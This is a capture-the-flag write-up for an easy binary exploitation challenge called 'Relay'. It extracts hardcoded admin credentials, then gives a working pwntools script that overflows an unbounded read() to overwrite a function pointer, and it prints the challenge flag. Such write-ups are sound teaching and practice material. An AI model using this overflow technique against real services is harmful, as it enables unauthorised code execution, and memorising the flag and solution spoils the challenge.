# Relay

## Category
Pwn

## Difficulty
Easy

## Summary
A relay station management binary contains hardcoded admin credentials in its read-only data section. After authenticating, a bounds-unchecked `read()` call in the remarks handler overflows a fixed-size station buffer and overwrites a function pointer. Triggering the diagnostic command calls the overwritten pointer, printing the flag.

## Provided Files
`pwn_relay.zip` containing Dockerfile, binary, and source

## Tools Used
- Python 3
- pwntools
- GDB

## Walkthrough

### Step 1: Extract Hardcoded Credentials

Inspect the binary's `.rodata` section with `strings` or a disassembler. The authentication handler contains plaintext credentials:
- Username: `NIGHTFALL`
- Password: `SIGMA-7F`

### Step 2: Authenticate

Connect to the service and provide the discovered credentials to unlock the full command set.

### Step 3: Overflow the Station Buffer

The `remarks` command calls `read(0, station + 0x30, 0x200)`. The station buffer is only `0x40` bytes. A function pointer is stored at `station + 0x70`.

To reach the function pointer from the start of the write (`station + 0x30`):
- Offset to function pointer: `0x70 - 0x30 = 0x40` (64 bytes of padding)

The target function `dump_station_keys()` at `0x00400d9c` prints the flag when called.

### Step 4: Trigger the Overwritten Pointer

The `diag` command calls the function pointer at `station + 0x70`. After sending the overflow payload, issuing `diag` redirects execution to `dump_station_keys()`.

```python
from pwn import *

HOST, PORT = '<target-ip>', <target-port>
io = remote(HOST, PORT)

io.sendlineafter(b'Username: ', b'NIGHTFALL')
io.sendlineafter(b'Password: ', b'SIGMA-7F')

io.sendlineafter(b'> ', b'remarks')
payload = b'A' * 64 + p32(0x00400d9c)
io.sendline(payload)

io.sendlineafter(b'> ', b'diag')
io.interactive()
```

## Key Findings
- Admin credentials are stored as plaintext strings in the binary's `.rodata` section, trivially discovered via `strings`
- The `read()` call uses a fixed large count (`0x200`) regardless of the actual buffer size, a classic unbounded read overflow
- No stack canary, no PIE; the function pointer address at `0x00400d9c` is static and requires no leak to use

## Final Answer
`Flag: HTB{r3l4y_k3ys_3xf1ltr4t3d_v14_d14g_0v3rfl0w}`

## Lessons Learned
Hardcoded credentials in shipped binaries are trivially discovered via `strings` or disassembly and represent an unconditional authentication bypass for anyone with access to the binary. The `read()` count parameter must always be bounded by the destination buffer size, not by an arbitrary large constant. Function pointers stored adjacent to user-controlled buffers are high-value targets; placing them in read-only memory or using indirect function call tables with bounds checks mitigates this class of vulnerability.
